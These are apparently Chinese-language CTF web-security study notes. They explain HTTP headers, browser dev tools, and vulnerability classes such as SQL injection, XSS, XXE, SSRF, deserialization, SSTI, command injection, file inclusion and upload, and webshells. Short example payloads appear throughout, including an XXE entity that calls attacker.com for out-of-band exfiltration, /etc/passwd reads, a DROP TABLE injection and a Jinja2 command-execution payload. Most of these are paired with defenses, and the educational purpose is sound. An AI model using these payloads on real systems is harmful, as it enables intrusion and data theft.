1. HTTP协议基础

HTTP（HyperText Transfer Protocol）是一种无状态的应用层协议。
无状态意味着服务器不会记住你之前做过的决定。

🔍 核心概念

  • 客户端（Client）：发起请求（Request），通常是浏览器或 Python 脚本。

  • 服务器（Server）：处理请求并返回响应。

  • 无状态性：服务器默认不记录两次请求之间的关联，通常通过 Cookie/Session 来维持状态。

2. HTTP请求方法详解

📊 GET VS POST

特性 GET 请求 POST 请求
主要用途 获取资源 提交数据
参数位置 参数直接暴露在 URL 中（如 ?id=1） 参数位于 请求体（Body）中，URL 不可见
安全性 会被浏览器缓存，历史记录可见（不安全） 默认不缓存，安全性相对较高
长度限制 受浏览器 URL 长度限制 理论上无长度限制，适合传输大量数据

📝 传参方式

  • GET传参：通常以 URL/?参数名=参数值 形式（如：URL/?a=1），可以直接在URL中修改参数进行测试。
    通俗解释：公开的例子

  • POST传参：需在请求体中通过工具（如 Burp Suite）构造，即用工具拦截和修改请求体。
    通俗解释：私密的东西

5. HTTP请求头解析

🔒 请求头：IP伪造与代理

  • X-Forwarded-For：记录客户端的真实IP地址（经过代理时）

    • 作用：伪造本地 IP（127.0.0.1）绕过访问限制、日志记录、反向代理
      <身份证上的真实身份>

  • Via：记录请求经过的代理服务器和网关

    • 作用：识别代理类型、绕过特定的过滤规则、追踪请求经过的中间节点、防止请求循环
      <旅行护照上的印章>

🍪 请求头：状态保持（Cookie）

Cookie 用于在客户端存储会话信息（发送服务器之前设置的Cookie信息）。
它是 CTF Web 题目中** 权限维持 **和 **身份伪造 **的核心。 

Cookie: user = admin; session_id = e10adc3949ba59abbe56e057f20f883e

常见操作

  • Cookie伪造/修改：CTF中常需要修改 user=guest 为 user=admin，或替换 JWT Token 来提升权限。

  • Cookie注入：如果后端直接使用 Cookie 中的值进入数据库查询，可能存在 SQL 注入漏洞。

🌐 请求头：内容协商

  • Accept：指定客户端能够接受的响应内容类型。常用于内容协商。

    • 示例：Accept: application/json, text/html
    • 应用：API 测试中强行要求返回 JSON 格式的数据。

  • Accept-Language：声明客户端期望的语言。常用于国际化。

    • 示例：Accept-Language: zh-CN, en;q=0.9
    • 应用：有时多语言网站会根据此头包含不同的文件，可能导致文件包含漏洞。

📋 请求头：主体元数据

Header 说明 示例与CTF考点
Content-Type 指示请求体中的MIME类型。告诉服务器请求体的数据格式，决定后端如何解析数据。常用于POST/PUT等请求。 应用：文件上传时修改 content-type 绕过白名单；将 json 改为 xml 触发 XXE。
Content-Length 指示请求体的长度（字节数）。告诉服务器请求体的大小。常用于确定数据传输完成。 应用：HTTP 请求走私攻击的核心，利用 CL 和 TE 头的不一致。

1. 查看源代码：发现隐藏的线索

在CTF比赛中，查看源代码是发现隐藏信息的重要手段。

🖱️ 常用方法与具体操作

方法 具体操作步骤 适用场景
鼠标右键 在网页空白处点击鼠标右键，选择“查看网页源代码”或“检查”。 寻找隐藏在HTML注释中的Flag（如 <!-- flag{xxx} -->）。
Ctrl + U 直接按下键盘上的 Ctrl + U 组合键，浏览器会立即新建一个标签页显示源代码。 某些网站使用 JS 屏蔽了右键菜单，使用这个方法可完美绕过。
开发者工具(F12) 按 F12 键，切换到 Elements 标签页。 查看经过JS动态渲染后的最终DOM结构，而不是原始文件。
view-source协议 在浏览器地址栏，将 URL 前面手动加上 view-source: 并回车。 前两个方法行不通，突破前端限制，获取服务器返回的原始形态代码（常用作绕过前端JS加密/跳转）。

🖱️ 通俗解释

“原始文件” 是由服务器发送的静态文本字符串，无论你在网页上进行了什么操作，这堆原始字符都不会变。

“最终 DOM 结构” 是由HTML 解析器 动态 解析原始文件生成了一棵DOM树，随后，浏览器会立刻执行文本里包含的 JavaScript 代码。

“view-source” 是浏览器内置的一个“伪协议”，在URL 前面手动加上 view-source: 可以发送 HTTP GET 请求和强制进入“原始文本显示模式” 。

view-source:协议 完全不启动 JS 引擎。

“前端限制” ：反爬/反调试脚本，右键屏蔽等前端逻辑限制你的操作。

💡 操作示例

  • 突破前端限制：如果网页用 JS 屏蔽了右键，直接在地址栏输入 view-source:http://靶机地址/login.php 即可获取原始代码。

  • 寻找隐藏线索：如果你先按 Ctrl+U 看原始源码，如果发现 什么都找不到，使用 Ctrl + F 在源代码页面搜索 flag、key、password 或 admin 等关键词，通常能快速定位到题目答案。

2. 开发者工具：你的解题利器

开发者工具（F12）是CTF解题的“瑞士军刀”。

📊 核心面板与实战操作

🔹 Elements（元素/检查器） - 修改前端限制

  • 查看实时DOM
  • 实时编辑HTML和CSS
  • 查看盒模型和计算样式

注：盒模型在 F12 中的 Elements 面板右侧，“Computed” 标签页中的特定区块；点击这个区块上图形的数字，可以修改当前元素的边距大小，浏览器会实时重绘页面的布局。

计算样式：

浏览器在渲染页面时，会收集元素上所有的 外部 CSS 文件（包括 嵌入式 <style> 标签、 内联 style="" 属性，以及 CSS 继承的样式）。经过 CSS 的 层叠（Cascade）与优先级计算后，最终确定的、实际生效的样式，就被称为 “计算样式”。

  • 操作步骤：按 F12 -> 点击左上角的小箭头（或按 Ctrl+Shift+C） -> 点击页面上想要修改的输入框或按钮。

  • 实战操作：如果页面提示“只能输入3位验证码”，在 Elements 面板中找到 <input maxlength="3">，双击将 3 改成 99，返回页面即可输入超长字符串进行测试；或者发现按钮是 disabled（禁用状态），直接把 disabled 属性删除，按钮就能立即点击。
    }

🔹 Console（控制台） - 执行JS代码

  • 执行JavaScript代码（主要）
  • 查看日志、错误、警告
  • 查看网络请求、安全错误等

JSFuck详解：JSFuck是一种基于JavaScript的深奥编程风格，只用6个字符就能编写出任何有效的JavaScript代码：[]()!+。

JSFuck 的核心原理，正是利用了 JavaScript 的 类型转换、 隐式转换 和 对象属性访问特性。

解码方式是将编码得到的JSFuck表示放在控制台并回车。

  • 操作步骤：按 F12 -> 点击 Console 标签页 -> 在 > 提示符后输入 JS 代码并回车。

  • 实战操作：

    • 输入 document.cookie 并回车，直接查看当前页面存储的浏览器 Cookie 信息。

    • 输入 alert(1) 测试是否存在 XSS 漏洞。

    • 输入 function test(){console.log("成功")}; test(); 自定义函数调试。

  • JSFuck解码实战：遇到题目给出一串类似 [][(![]+[])...] 的代码，直接复制粘贴到 Console 控制台中并按下回车，即可立即解码出原本的 JS 逻辑。

🔹 Network（网络面板） - 分析请求过程

  • 请求列表：每列可自定义（Name、Status、Type、Initiator等）
  • 请求按时间顺序排列
  • 颜色标识：绿色（缓存或304）、蓝色（正常加载）、红色（失败请求）

请求详情

  • Headers：请求和响应头
  • Preview：响应预览（JSON、图片等）
  • Response：原始响应数据
  • Timing：详细的请求时间线
  • Initiator：触发请求的调用栈

  • 操作步骤：按 F12 -> 点击 Network 标签 -> 勾选左上角的 Preserve log（保留日志） -> 刷新网页。此时页面发出的所有请求都会出现。

  • 实战操作：

    • 点击某个 .php 或 .js 请求，点击右侧的 Headers：查看 Cookie、User-Agent 等发送给服务器的信息。

    • 点击 Response：查看服务器返回的原始数据。如果是 JSON 格式的接口，可能直接包含账号密码或 Flag。

    • 技巧：观察请求列表的“大小（Size）”和“耗时（Time）”，快速找出被隐藏的后台 API 接口。

🔹 Application（应用面板） - 伪造身份

  • 管理浏览器本地存储资源，包括Cookies、LocalStorage等

  • Cookie管理：查看、编辑、删除Cookie，设置Domain、Path、Expires等

  • 一般会在“应用”里的“存储”部分查看cookie相关信息，也是CTF中收集信息的重要位置

  • 操作步骤：按 F12 -> 点击 Application 标签 -> 点击左侧 Storage 下的 Cookies -> 查看 https://当前域名 下的列表。

  • 实战操作：

    • 当题目要求“必须是 admin 才能查看 flag”时，双击 Cookie 列表里的 role 或 user_id 值，将其手动修改为 admin 或 1。

    • 点击下方灰色区域可添加新 Cookie（如添加 flag=1 绕过服务器逻辑），修改后刷新页面，看是否触发漏洞。

学习日记3 Web入门

本篇博客对上一篇没讲完的漏洞进行了补充简要介绍，后续会对单个类型的漏洞深入学习。 <第三周 1>

一、SQL注入

核心内容：
构造恶意SQL语句，绕过应用过滤即骗过网站的防御机制，获取数据库敏感信息或执行命令。

四种注入类型

  1. 联合注入（UNION注入）

    • 原理：UNION 的意思是“联合、合并”，攻击者利用这个操作，将恶意要求放在正常信息后面，从而进行攻击。

    • 利用场景：页面有数据回显（如显示用户信息，获取密码）。

    • 示例： id=1 UNION SELECT 1,2,database()--

注：（database()获取当前数据库名）。 ‘--’是注释掉语句的意思，这样避免报错，顺利进行攻击。

  • 防御：用参数化查询（如PDO的prepare）代替字符串拼接，避免直接拼接用户输入，相当于不让攻击者自己生成指令单。

  1. 报错注入

    • 原理：故意构造违反SQL语法的乱码公式，迫使数据库崩溃报错并输出敏感数据（如updatexml、extractvalue）。

    • 利用场景：不显示正常的查询内容，但有具体的错误提示（如“SQL syntax error”）。

    • 示例：id=1' and updatexml(1,concat(0x7e,user()),1)--

    （user()获取当前用户名）。 攻击者输入“查订单号1，顺便塞个算不出来的乱码公式，公式里藏着获取管理员名字的指令”——电脑报错时，直接输出管理员名字。

    • 防御：禁用错误信息（如MySQL的sql_mode），避免输出具体的报错原因。

  2. 盲注

    • 原理：通过页面状态（布尔盲注）或时间延迟（时间盲注）这两个方法推断出机密数据。

    • 利用场景：无任何回显（如登录页面），既不显示查询的数据也不报错。

    • 示例（时间盲注）：
      id=1' AND IF(ascii(substr(database(),1,1))=115,sleep(3),0)--

    示例的意思：（如果数据库名首字母是's'，网页会延迟3秒再刷新），如果真的延迟了三秒，那么证明攻击者猜对了。

    • 防御：限制查询时间（如MySQL的max_execution_time），避免长时间执行。

  3. 堆叠注入

    • 原理：用分号;拼接多条SQL语句，执行多个命令。

    • 利用场景：支持多语句执行，相当于一次性接受多条指令。

    • 示例：id=1; DROP TABLE users--

      （删除users表）。

    • 防御：禁用多语句执行（如PHP的mysql_multi_query），只允许单语句查询。

二、XSS与XXE

核心内容：XSS是攻击者向电脑里注入恶意代码，让浏览器自动执行恶意命令。
XXE是注入外部实体，让电脑的系统自动执行恶意操作。

详细解析

  1. XSS（跨站脚本攻击）

    • 类型：

      • 存储型：恶意脚本存入数据库（如留言板），用户访问时执行。

      • 反射型：恶意脚本附在URL中（如?msg=<script>alert(1)</script>），服务器原样返回。

      • DOM型：纯前端DOM结构修改（如javascript:alert(1)），不经过服务器。
        即直接在你的浏览器里修改内容。

      • 利用场景：窃取Cookie、劫持会话、钓鱼攻击。
        注：具体解释在前几篇有。

    • 防御：

      • 输出时编码（如HTML实体编码：<→&lt;）；即将一些特殊符号编写成别的样子，浏览器会将其认为是普通文字。

      • CSP（内容安全策略）限制脚本来源；禁止执行未知的来源脚本。

      • HttpOnly Cookie防止JavaScript读取。注：相当于给加了个安全锁

  2. XXE（XML外部实体注入）

    • 原理：XML解析器是一种文件处理工具，攻击者提交解析XML时，电脑的XML未禁用外部实体加载，导致读取本地文件或发起网络请求，攻击者就达到了攻击的目的。

    • 利用场景：

      • 带外通信（OOB）：<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]>，将数据外带。

      • 内网探测：<!ENTITY xxe SYSTEM "file:///etc/passwd">，读取本地敏感文件。

    • 防御：

      • 禁用外部实体（如PHP的libxml_disable_entity_loader(true)）；

      • 限制XML解析器的功能（如XMLParser的setOption(XMLParser::DISALLOW_FILE)）。

三、SSRF（服务端请求伪造）

核心内容：攻击者利用 ‘服务器’ 发起请求，绕过防火墙，访问内网资源。

详细解析

  • 原理：攻击者构造URL，相当于在一个可填网址的地方故意填一个内网网址，让服务器发起请求（如http://internal-server），绕过外部防火墙，获取内网信息。

  • 利用场景：

    1. 内网探测：扫描内网IP（如http://192.168.1.1），获取存活主机和服务端口。

    2. 读取本地文件：利用协议（如file:///etc/passwd）读取服务器敏感文件。
      注：file 属于特殊指令。

    3. 高阶攻击：结合dict://、gopher://等协议，发送定制化TCP数据包，执行系统命令。
      （如gopher://127.0.0.1:80/_POST /shell.php HTTP/1.1...）。

  • 防御：

    • 限制请求协议（如只允许http/https，禁止file/dict）；

    • 验证URL域名，即只允许访问白名单上网址（如白名单限制为example.com）；

    • 使用curl_setopt($ch, CURLOPT_REDIR_PROTOCOLS, 'http,https')限制重定向协议。
      即如果服务器在访问过程中被要求“跳转”到其他网址，只允许它跳转到用http或https协议的地方.

四、反序列化漏洞

核心内容：用户可控的序列化字符串，触发"魔术"方法（如__wakeup、__destruct），执行恶意代码。

详细解析

  • 原理：unserialize()过程中，即反序列化过程，系统自动调用魔术方法，如果反序列化的数据是用户可以控制的,攻击者可以构造一串序列化字符串，即构造POP链（属性导向编程）执行恶意命令。

  • 利用场景：

    • PHP的unserialize()函数（如unserialize($_GET['data'])）。
      <用户提交的数据被直接丢给系统的unserialize() 去处理>

    • 示例POP链：O:4:"User":2:{s:8:"username";s:5:"admin";s:12:"__destruct";a:1:{i:0;O:6:"Logger":1:{s:8:"log_file";s:10:"shell.php";}}}

    （__destruct触发Logger的log_file属性，写入shell.php）。
    这是一串较长的作用链。
    通俗解释：“这是一个叫User的包裹，里面存在一个名叫__destruct的‘销毁触发器’；当系统销毁这个包裹时，会触发连锁反应，去调用一个叫Logger（日志工具）的功能，并把它的目标文件设为shell.php。” 后面系统拆包时刚好中计，攻击者就能借此控制服务器了。

  • 防御：

    • 禁用unserialize()（如PHP的disable_functions）；

    • 用JSON代替序列化（如json_decode，无魔术方法）；

    • 验证序列化数据（如检查类名、属性值是否符合预期）。

五、SSTI（服务端模板注入）

核心内容：模板引擎解析用户输入，执行恶意代码。

详细解析

  • 原理：Web框架的模板引擎（如Python的Jinja2）动态渲染页面时，错误地将用户输入作为模板语法执行。

  • 利用场景：

    • Jinja2：利用魔术属性（__class__、__mro__）获取基类，调用os.popen或subprocess执行命令。

    • 示例Payload：{{ ''.__class__.__mro__[2].__subclasses__()[40]('ls -la').read() }}

      （获取subprocess.Popen类，执行ls -la）。
      通俗解释：从空字符串开始 '' -> 查出它属于什么类别 class -> 找到它的源头基类 mro -> 翻出源头都留下了什么__subclasses__() -> 拿出第40号 一个能执行系统命令的工具 -> 让它执行 ls -la（列出当前目录所有文件） -> 获得最终结果

  • 防御：

    • 禁用模板引擎的危险属性（如Jinja2的autoescape）；

    • 限制模板语法（如只允许变量，禁止方法调用）；

    • 用沙箱环境（如Docker）隔离模板执行。

总结：五大漏洞的“攻防逻辑”

漏洞类型 攻击核心 防御核心
SQL注入 构造恶意SQL语句 参数化查询、输入过滤
XSS/XXE 注入脚本/实体 输出编码、禁用外部实体
SSRF 服务器发起请求 限制协议、验证URL
反序列化 触发魔术方法 禁用unserialize、验证数据
SSTI 模板引擎执行代码 限制模板语法、沙箱隔离

如何防御： 数据与指令分离（用户填的永远是“值”，永远不能变成“查询动作”）
给数据消毒降级（让恶意代码失去“执行力”，变成纯文本）
划定牢笼边界（就算恶意代码被执行了也无法进入核心地界）

学习日记2 Web入门

本篇博客简要介绍了Web方向上常见的一些漏洞，进行一个初步的了解。

一、 信息泄露

定义：
源代码/配置文件/系统内部信息 被非法访问。

常见场景：

Git/SVN版本控制文件泄露：
程序员用Git/SVN管理代码时，会生成一个隐藏的.git目录（存代码修改历史）。如果部署网站时没删这个目录，攻击者就能通过访问 /项目名/.git/ 下载整个项目的源码（包括密码、漏洞）。

网站备份文件遗留：
网站管理员备份文件时，会生成.bak（备份副本）、.swp（临时文件）、.zip（压缩包）。同理，如果没有删除这些，攻击者可以获得敏感信息。

目录遍历：
网站服务器配置错误，允许通过URL“跳目录”访问不该访问的文件。
简单解释就是网站代码没有过滤 ../ 这种向上跳转目录的符号，攻击者可以用这个方法读取服务器上任意文件。
示例：?file=../../../../etc/passwd 最终读取到Linus系统根目录。
注：/etc/passwd 是Linux 系统的用户清单文件。

CTF典型示例：
扫描.git目录拿源码（运用工具扫描网站，下载 /.git/ 目录）

输入 ?file=../../../../etc/passwd 读系统核心文件

危害： 攻击者可分析源代码漏洞直接攻击网站，分析配置文件窃取用户数据，拿到系统内部信息精准攻击。

二、 命令执行漏洞（RCE）

原理剖析：
应用程序未对用户输入进行严格安全过滤,用户能通过输入控制服务器执行任意命令

毁灭性危害： 这是Web安全领域最严重的漏洞之一。攻击者利用RCE可获取与Web服务同等权限的服务器控制权，进而执行任意操作（如增删改查文件、反弹Shell、植入持久化后门），对系统安全造成毁灭性打击。

可能引发RCE的高危函数：

语言 危险函数
PHP system()、exec()、passthru()、eval()
Python os.system()、subprocess.run()
Java Runtime.getRuntime().exec()、ProcessBuilder
Node.js child_process.exec()、child_process.spawn()
  • system()：执行系统命令
  • exec()：执行命令并返回输出
  • passthru()：执行命令并输出原始结果
  • eval()：执行PHP代码
  • os.system()：执行系统命令
  • subprocess.run()：执行命令并获取结果，未过滤输入
  • Runtime.getRuntime().exec()：执行系统命令
  • ProcessBuilder：构建进程，未过滤输入
  • child_process.exec()：执行命令并回调结果
  • child_process.spawn()：启动新进程，未过滤输入

关键提醒：这些函数本身没问题，但未对用户输入做安全过滤（如escapeshellarg()）就会导致RCE！

经典Payload：
?ip=127.0.0.1;cat /flag (通过 ； 拼接命令，先执行IP，再执行cat /flag 即读取敏感文件)

ping -c 3 127.0.0.1 | whoami （通过 | 拼接命令， 与上文同样道理，whoami是用于获取当前用户权限）

注：构造payload有一些技巧，如命令拼接（用分号 ； 管道符 | 反引号` 等）
编码绕过（将命令伪装成乱码 方法有Base64编码，URL编码等 由于方法较为陌生 后面深入学习会再次介绍）
盲命令执行（攻击者无法直接看到命令输出的结果，可通过Ping探测，Curl传结果等方法侧面判断命令是否成功执行）

三，文件包含与文件上传

文件包含

本质：服务器加载用户指定的文件，但未对路径做安全检查，攻击者可以骗服务器加载任意文件。

类型：

本地文件包含（LFI）：只能包含服务器本地的文件（如/var/log/apache2/access.log）。

远程文件包含（RFI）：能包含外部URL的文件。

常见利用场景：

读取敏感文件：通过包含日志文件（如Apache：网页服务器软件 的access.log）、临时文件（如PHP：后端脚本解释器 的session文件）、配置文件（如/etc/passwd）获取信息。

例子：

?file=../../../../var/log/apache2/access.log（包含日志，里面有用户访问记录）。

注： - ?file=：表示我要包含的文件路径，?file=xxx会让服务器读取xxx文件并显示内容。

  • ../../../../：是路径跳转的意思

  • var/log/apache2/access.log：这是Linux系统中Apache服务器的访问日志文件，里面记录了所有访问该网站的用户信息

php://filter/convert.base64-encode/resource=secret.php（读取加密源码）。

注： - php://：这是PHP的伪协议，可进行特殊操作。

  • filter：用于处理文件内容

  • convert.base64-encode：把文件内容转换成base64编码

  • resource=secret.php：要读取的文件名是secret.php 。

data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+（直接执行代码）

注：- data://：PHP的伪协议

  • text/plain：MIME类型（表示“纯文本”）。

  • base64,：表示后面的字符串是base64编码的。

  • PD9waHAgcGhwaW5mbygpOz8+：这是<?php phpinfo(); ?>的base64编码（phpinfo()是PHP的函数，会显示PHP的版本、配置、扩展等信息）。

防御措施： 用白名单代替黑名单（只允许包含特定目录的文件，如/var/www/html/）。

对输入严格过滤。

禁用allow_url_include（防止远程文件包含）。

对路径做严格验证（如realpath()获取绝对路径，检查是否在允许目录内）。

文件上传

本质：攻击者上传文件时，服务器未对文件做严格检测，导致“恶意文件被保存并执行”。

绕过检测的技巧：

1. 00截断：

旧版PHP（<5.3.4）处理字符串时，遇到%00（空字符）会停止，只取前面的部分，用这个漏洞通过%00截断路径（如ABC.php%00.jpg，服务器只取ABC.php,这样可以上传服务器原本禁止上传的文件，比如例子中带.php 后缀的文件）。

2. 双写后缀：

服务器解析文件后缀时，可能只看最后一个.php，或者中间的.jpg被忽略，此时你可以在.php后面加上 .jpg ，然后上传成功。

3. .htaccess解析：

.htaccess是Apache服务器的“配置文件”，可以设置“让.jpg文件当.php执行”，在.htaccess该文件中写下 AddType application/x-httpd-php .jpg 这个内容，让图片文件（如evil.jpg）以PHP执行，然后服务器就可以执行里面的代码。

利用流程： 绕过前端检测（如JS验证文件类型）。

绕过后端检测（如MIME类型、文件头、后缀黑名单）。

上传Webshell（如evil.php或evil.jpg，即恶意文件）。

访问Webshell（如http://site.com/uploads/evil.jpg 。

防御措施： 检测文件内容 生成随机文件名 禁用.htaccess

Webshell提权

本质：通过Webshell（恶意代码）获取服务器控制权，再提升权限（从普通用户升级到root）。

Webshell类型： PHP，ASP，JSP。
以上三种都属于“一句话木马”，因为代码简短。
攻击者使用专门的工具 填入木马文件的网址，填入密码，然后获取文件。

提权方式：

SUID提权：系统给一些程序特殊通行证，使得具有普通权限的用户可以修改密码，这个通行证叫 SUID ，攻击者可以寻找哪些程序开启了 SUID，但它本身又可以被操控，从而利用它来执行 root 命令。

内核漏洞：攻击者可利用Linux系统本身的漏洞，获取root权限。

服务漏洞：利用运行中的服务（如SSH、MySQL）的漏洞，提权到root。

持久化： 添加系统用户
安装后门

Base64编码的应用

本质：把恶意内容（如Webshell、命令）转换成“看不懂的字符串”，绕过过滤。

常见场景： 编码Webshell，编码命令， 绕过过滤： 过滤系统可能只检测“明文危险字符”（如cat、/），但不认识Base64编码的字符串，所以能通过检测。

1. 什么是XSS漏洞？

XSS（跨站脚本攻击，Cross-Site Scripting）是Web中最经典的高危漏洞之一。

漏洞成因：网站对用户输入的内容没有做过滤，转义，进化，导致攻击者可以提交恶意JS代码，代码被页面解析执行，从而实现劫持页面、窃取 Cookie、钓鱼、篡改页面等攻击行为。

简单来说：用户写的代码，被网站原样运行了，攻击者利用它让浏览器跑任意脚本。

2. XSS漏洞三大分类

####（1）反射型XSS（非持久化） 恶意代码通过URL 参数传递，一次性执行、不会存储在服务器，仅当前访问生效。

特点：需要诱导用户点击特制链接，时效性短、无法持久。

常见场景：搜索框回显、URL参数直接渲染页面。

经典测试Payload：`<script>alert(1)</script>`

####（2）存储型XSS（持久化） 用户提交的恶意JS代码，被服务器存入数据库、文件、留言板等，所有访问该页面的用户都会触发漏洞。

特点：危害最大、持久性强、无需诱导点击，属于高危漏洞。

常见场景：论坛留言、评论区、个人资料编辑、文章投稿。

####（3）DOM型XSS 不经过服务器数据交互，完全由前端JS逻辑导致的漏洞。前端JS直接读取URL、Location、Hash等参数，操作DOM节点渲染页面，未过滤参数导致代码执行。

特点：纯前端漏洞，流量不会经过服务器，隐蔽性极强。

3. XSS常见攻击危害

  • 窃取用户 Cookie，实现账号劫持、登录他人账号。
  • 篡改页面内容，搭建钓鱼页面、诱导用户输入信息。
  • 配合 CSRF 漏洞，执行越权操作。
  • 植入恶意代码、挖矿脚本、木马等。

4. XSS基础防御方案（开发&安全必知）

  • 输入过滤：严格过滤特殊字符 < > & " ' 等，阻止恶意代码注入。
  • 输出转义：前端渲染动态数据前，统一进行 HTML 实体转义，防止标签被解析。
  • Cookie HttpOnly：禁止 JS 读取 Cookie，防止会话劫持。
  • 开启 CSP 策略：限制页面恶意脚本执行。

0x04 前端安全延伸知识点

JS存取器 get/set

本题中 score 属于 JS 存取器属性，拥有 get（读取）和 set（赋值）方法。即便前端写死分数限制逻辑，用户依旧可以通过浏览器控制台强制赋值绕过。请牢记：所有前端校验都是不可信的。

安全开发铁律： 核心业务判断、权限校验、数据统计等逻辑，绝不可信任前端，必须放在后端实现。
